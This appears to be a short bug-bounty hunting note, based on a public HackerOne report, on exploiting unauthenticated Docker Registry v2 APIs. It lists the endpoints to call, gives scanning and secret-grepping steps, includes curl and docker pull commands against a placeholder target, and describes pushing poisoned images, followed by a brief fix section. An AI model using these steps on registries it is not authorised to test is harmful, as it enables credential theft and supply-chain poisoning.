---
name: info-exposed-docker-registry
description: Exposed Docker Registry HTTP API v2 → image dumping & poisoning. Teaches enumerating and exploiting unauthenticated container registries.
sources: hackerone_public
report_count: 1
---

# Exposed Docker Registry → Image Dump / Poisoning

**Report**: Semmle — "Docker Registry HTTP API v2 exposed without authentication leads to image dumping/poisoning" (#347296).

## Why it matters (the new lesson)
A Docker registry (`registry:5000/v2/`) left unauthenticated lets an attacker list catalogs, pull (download) every image — extracting secrets, source, and credentials baked into layers — and **push** poisoned images that get deployed. A single open registry can compromise an entire CI/CD pipeline.

## How it works
```
GET /v2/_catalog                          → {"repositories":[...]}
GET /v2/<name>/tags/list                  → tags
GET /v2/<name>/manifests/<tag>            → manifest
GET /v2/<name>/blobs/<digest>             → layers (tar, contains secrets)
PUT /v2/<name>/manifests/<tag>            → push poisoned image
```

## How to hunt for it
1. Port-scan 5000/5001/443 (and `/v2/`) on hosts.
2. Hit `/v2/_catalog` and `/v2/_catalog?n=1000` without auth.
3. Pull a layer and grep for `BEGIN`, `password`, `.env`, keys.

## Payloads / tooling
```
curl http://target:5000/v2/_catalog
docker pull target:5000/<repo>:<tag>  (after login bypass)
```

## Fix
Require auth (basic/token) on registry; network-isolate; enable vulnerability scanning; audit images for secrets.
